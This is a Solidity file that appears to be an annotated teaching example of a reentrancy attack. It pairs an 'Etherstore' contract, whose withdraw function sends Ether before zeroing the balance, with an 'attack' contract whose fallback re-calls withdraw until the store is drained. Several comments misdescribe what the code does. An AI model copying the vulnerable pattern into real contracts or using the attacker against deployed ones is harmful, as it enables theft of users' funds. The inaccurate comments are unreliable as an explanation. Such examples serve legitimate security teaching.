// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Etherstore{

    // Create a public mapping named balances with address as key and uint as value 
    mapping(address => uint) public balances; 

    // Create a function to deposit ether (the attacker needs to deposit first before withdrawing) 
    function deposit() public payable{
    //adding the amount to the balances of msg.sender 
        balances[msg.sender] += msg.value; // method 2: balances[msg.sender] = balances[msg.sender] + msg.value; 
    }

    //Create a function for users to withdraw and made it public
    function withdraw() public {
        uint bal = balances[msg.sender]; //determine the balance of msg.sender
        require(bal > 0); // withdrawal can only succeed if balances of msg.sender is more than 0 

//line 24 and 26 will not execute because we do not give it a chance to execute 
       (bool sent, ) = msg.sender.call{value: bal}("Insufficient funds"); //send Ether to the address of the caller with call method if there is enough money, 
       //otherwise it will show a message about insufficient funds 
       require(sent, "Failed to send Ether"); //check if the withdrawal has been send, otherwise it show an error that the transaction has failed 

    balances[msg.sender] = 0;  //to update the balance of msg.sender to zero since before sending the money 
    //we are nullifying to 0, not updating the balance on time so that all the money inside the first contract can be exhausted 
    }
    
    function getBalance() public view returns(uint){  //to know the balance of the contract (how much is in the contract)
        return address(this).balance; 
        
    }
}

//Create an attack contract (by the attacker) 
contract attack { 
    Etherstore public etherstore; //Create a state variable etherstore and make it public —> that will enable the attacker to communicate directly with the contract Etherstore                                                                                               //Create a state variable etherstore and make it public —> that will enable us to communicate directly with the contract Etherstore 

//constructor that is taking the address of contract to be attacked as input 
    constructor (address _etherStoreAddress) { 
        etherstore = Etherstore(_etherStoreAddress);  //Initialise the address of the contract and store it inside a new variable with similar name
        //a state variable etherstore to redefine the contract, points the address of the attack contract as recipient 
    }

    //Fallback is called when Etherstore sends Ether to this contract, 
    //it will permit the contract attack to receive Ether and calls withdraw function over and over again
    fallback() external payable{
        if(address(etherstore).balance >= 1 ether)  //check if the attacker's balance has 1 or more than 1 Ether 
        etherstore.withdraw(); // append the name of the contract with withdraw function, will check if the attack can be executed 
    }


    function Attack() external payable{
        require(msg.value >= 1); // check if the contract that we want to attack have enough Ether: balance is greater or equal to 1 
        etherstore.deposit{value: 1 ether }(); /*first is to deposit because the attacker needs to contribute first: 
        the attacker calling deposit function to deposit 1 ether to the malicious contract */
        
        etherstore.withdraw(); /*calling the withdraw function from the normal contract to 
        immediately withdraw, and can continuously repeat the same action until drain all the funds stored on the main contract*/
    }

    function getBalance() public view returns(uint){ //to check the balance of this contract 
        return address(this).balance; 
    }
 }   
